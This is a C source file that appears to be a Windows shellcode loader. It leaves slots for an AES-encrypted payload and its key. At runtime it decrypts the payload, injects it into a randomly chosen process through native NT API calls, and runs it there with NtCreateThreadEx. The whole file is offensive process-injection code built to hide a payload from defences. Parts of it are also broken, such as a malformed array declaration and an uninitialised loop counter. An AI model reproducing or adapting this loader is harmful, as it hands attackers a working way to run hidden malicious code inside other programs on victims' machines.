//________________/INCLUDES\__________________
#include <windows.h> 
#include <stdbool.h> 
#include <psapi.h>
#include <stdlib.h>
#include <wincrypt.h>
#include <time.h>
#include <stdio.h>
#include <time.h>

//________________/SHELLCODE\__________________
const char            dk[] = { "INSERT" };
const unsigned char[] sh = { "INSERT" }

//__________/GLOBAL DEFINITIONS AND VARS\__________
#define STATUS_SUCCESS (NTSTATUS)0x00000000L

DWORD g_NtOpenProcessSSN;
DWORD g_NtAllocateVirtualMemorySSN;
DWORD g_NtWriteVirtualMemorySSN;
DWORD g_NtProtectVirtualMemorySSN;
DWORD g_NtCreateThreadExSSN;
DWORD g_NtWaitForSingleObjectSSN;
DWORD g_NtFreeVirtualMemorySSN;
DWORD g_NtCloseSSN;

NTSTATUS STATUS; 
HANDLE hProcess, hThread = INVALID_HANDLE_VALUE;
//_________________/OPTIONS\________________
const bool debug = true; // SET TO FALSE WHEN DONE

#define DEBUG
#ifdef DEBUG
  #define POSITIVE(MSG, ...) printf("[+] "      MSG "\n", ##__VA_ARGS__)
  #define INFO(MSG, ...)     printf("[*] "      MSG "\n", ##__VA_ARGS__)
  #define NEGATIVE(MSG, ...) printf("[-] "      MSG "\n", ##__VA_ARGS__)
#endif
//_____________/NTAPI FUNCTIONS_____________
#define NT_FUNCTIONS
#ifdef NT_FUNCTIONS
typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
    PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;
typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL};
#endif

//______________/MY FUNCTIONS\________________
void HEX(const BYTE* data, DWORD length) {

    //_________/JUST PRINTS HEX NICELY\________
    printf("\n");
    DWORD j = 1; 
    for (DWORD i = 0; i < length; i++, j++){ 
        printf("%02X ", data[i]);
        Sleep(3);
        if (j == 18) {
            if (i < length){
                printf("\n");
                j = 0;
            }
        }
    }
    printf("\n");
}

int AES256(char * sh, DWORD sh_len, char * dk, size_t dk_len) {

    //_________________/START\__________________

    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    //_________/GETS THE ALGORITHM FOR RSA AND AES\________
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
            if (debug == true){NEGATIVE("CryptAcquireContextW() returned [%ld]", GetLastError());}
            return EXIT_FAILURE;
    }

    //______________/CREATES A HASH OBJECT\______________
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
            if (debug == true){NEGATIVE("CryptCreateHash() returned [%ld]", GetLastError());}
            return EXIT_FAILURE;
    }

    //________/HASHES THE KEY FOR CORRECT SIZE IN DECRYTPION\________
    if (!CryptHashData(hHash, (BYTE*)dk, (DWORD)dk_len, 0)){
            if (debug == true){NEGATIVE("CryptHashData() returned [%ld]", GetLastError());}
            return EXIT_FAILURE;              
    }

    //__________/CREATES SUITABLE AES_DECRYPTION KEY\___________
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
            if (debug == true){NEGATIVE("CryptDeriveKey() returned [%ld]", GetLastError());}
            return EXIT_FAILURE;
    }

    //__________/FINALLY ACTUAL DECRYPTION OF THE GIVEN BINARY\__________
    if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, sh, &sh_len)){
            if (debug == true){NEGATIVE("CryptDecrypt() returned [%ld]", GetLastError());}
            return EXIT_FAILURE;
    }

    //______/FREE MEMORY\______
    CryptReleaseContext(hProv, 0); CryptDestroyHash(hHash); CryptDestroyKey(hKey);
    if (debug == true){printf("\t\t\t\\___Binary was sucessfully decrypted\n");}
    return EXIT_SUCCESS;  
    
    //_________________/END\__________________
}

void Get_Sysnumber(HMODULE NtdllHandle, LPCSTR NtFunctionName, PDWORD NtFunctionSSN) {
    /*-----------[SEEK SYSCALLS]-----------*/
    UINT_PTR NtFunctionAddress = 0;

    NtFunctionAddress = (UINT_PTR)GetProcAddress(NtdllHandle, NtFunctionName);
    if (0 == NtFunctionAddress) {
        NEGATIVE("GetProcAddress[%ld]", GetLastError());
        return;
    }

    *NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 0x4))[0];
    if (debug == true){
    INFO("[0x%p] [0x%0.3lx] -> %s", (PVOID)NtFunctionAddress, *NtFunctionSSN, NtFunctionName);
    }
    return;
}

int New_Line(int count){
    //______/VERY COMPLICATED FUNCTION! STAY AWAY!\____
    for (int i; i < count; i++){
        printf("\n");
    }
}

int return_hProcess(){
    //_________________/START\__________________    
    DWORD processes[2000];
    DWORD cb = sizeof(processes);
    DWORD bytesReturned;
    srand((unsigned int)time(NULL)); 

    //_____________/ENUMERATES THE PROCESSES\___________
    if (!EnumProcesses(processes, cb, &bytesReturned)){
        if (debug == true){NEGATIVE("EnumProcesses() ");}
        return EXIT_FAILURE;
    } else{
        if (debug == true){New_Line(1); POSITIVE("EnumProcesses() returned %ld bits", bytesReturned*8);}
    }
    DWORD processCount = bytesReturned / sizeof(DWORD);
    bool found = false;

    //_____________/TRIES PIDS FROM PROCESSES[]\___________
    while (found == false){
        DWORD i = rand() % processCount + 1;
        DWORD PID = processes[i];
        CLIENT_ID CID = {(HANDLE)PID, NULL};
        STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
        if (STATUS == STATUS_SUCCESS){
            if (debug == true){printf("\t\t  \\___PID[%ld]{-%ld}, hProcess -> [0x%p]\n", PID, i, hProcess);}
            found = true; //_____/A PID IS FOUND\_____
        }
    }
    if (STATUS != STATUS_SUCCESS){
        if (debug == true){NEGATIVE("Tried all [%ld] PID's", processCount);}
        return EXIT_FAILURE;
    }

        //_________________/END\__________________    
}

int main(void){
    //__________________/SOME VARS USED LATER\___________________
    HMODULE hNtdll;
    LPVOID rBuffer = NULL;
    SIZE_T sh_len = sizeof(sh);
    DWORD oldprotect = 0;
    SIZE_T bytes = 0;
    
    //__________________/GETS SSN\___________________
    hNtdll = GetModuleHandleW(L"NTDLL");

    Get_Sysnumber(hNtdll, "NtOpenProcess", &g_NtOpenProcessSSN);
    Get_Sysnumber(hNtdll, "NtAllocateVirtualMemory", &g_NtAllocateVirtualMemorySSN);
    Get_Sysnumber(hNtdll, "NtWriteVirtualMemory", &g_NtWriteVirtualMemorySSN);
    Get_Sysnumber(hNtdll, "NtProtectVirtualMemory", &g_NtProtectVirtualMemorySSN);
    Get_Sysnumber(hNtdll, "NtCreateThreadEx", &g_NtCreateThreadExSSN);
    Get_Sysnumber(hNtdll, "NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN);
    Get_Sysnumber(hNtdll, "NtFreeVirtualMemory", &g_NtFreeVirtualMemorySSN);
    Get_Sysnumber(hNtdll, "NtClose", &g_NtCloseSSN);
    
    //----[FUNCTION FOR PROCESS HANDLE]-----
    return_hProcess();

    //----[VIRTUAL ALLOC]-----
    STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &sh_len, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if (STATUS != STATUS_SUCCESS){if (debug == true){NEGATIVE("NtAllocateVirtualMemory[%zu::BYTES] -> Error[0x%lx]", sh_len, STATUS); return EXIT_FAILURE;}} else {
        if (debug == true){POSITIVE("NtAllocateVirtualMemory[%zu::BYTES] -> Addr[0x%p]", sh_len, rBuffer);}
    }
    //----[CHANGE PERMS FOR BUFFER]-----
    STATUS = NtProtectVirtualMemory(hProcess, &rBuffer, &sh_len, PAGE_EXECUTE_READWRITE, &oldprotect);
        if (STATUS != STATUS_SUCCESS){if (debug == true){NEGATIVE("NtProtectVirtualMemory[PAGE_READWRITE::PAGE_EXECUTE_READWRITE] -> Error[0x%lx]", STATUS); return EXIT_FAILURE;}} else {
            if (debug == true){POSITIVE("NtProtectVirtualMemory[PAGE_READWRITE::PAGE_EXECUTE_READWRITE] -> [STATUS_SUCCESS]");}
        }

    //----[RUNTIME AES DECRYPT]-----
    if (debug == true){INFO("AES runtime decryption started..."); Sleep(300);}
    AES256(sh, sizeof(sh), dk, sizeof(dk)); if (debug == true){HEX(sh, sizeof(sh));}

    //----[WRITES SH TO BUFFER]-----
    STATUS = NtWriteVirtualMemory(hProcess, rBuffer, sh, sh_len, &bytes);

    if (STATUS != STATUS_SUCCESS){if (debug == true){NEGATIVE("NtWriteVirtualMemory[%zu::BYTES] -> Error[0x%lx]", bytes, STATUS);} return EXIT_FAILURE;} else {
            if (debug == true){POSITIVE("NtWriteVirtualMemory[%zu::BYTES] -> [STATUS_SUCCESS]", bytes);}}

    //----[CREATES A EXECUTION THREAD]-----
    STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, 0, 0, 0, 0, NULL);

    if (STATUS != STATUS_SUCCESS){if (debug == true){NEGATIVE("NtCreateThreadEx[%zu::BYTES] -> Error[0x%lx]", bytes, STATUS);} return EXIT_FAILURE;} else {
            if (debug == true){POSITIVE("NtCreateThreadEx[(0x%p), (0x%p)] -> [%p]", hProcess, rBuffer, hThread);}}
    
    WaitForSingleObject(hThread, INFINITE);

    //----[CLEANUP]-----
    if (debug == true){INFO("[0x%p] Thread finished! Cleaning up memory..", hThread);}

    STATUS = NtFreeVirtualMemory(hProcess, &rBuffer, &sh_len, MEM_DECOMMIT);
    if (STATUS == STATUS_SUCCESS){
        if (debug == true){POSITIVE("[%zu::BYTES] cleared from rBuffer[0x%p]", sh_len, rBuffer);}
    } else {
        if (debug == true){NEGATIVE("Unable to clear memory in rBuffer[0x%p] -> Error[0x%lx]", rBuffer, STATUS);}
    }

    NtClose(hProcess); NtClose(hThread);
    return EXIT_SUCCESS;
}
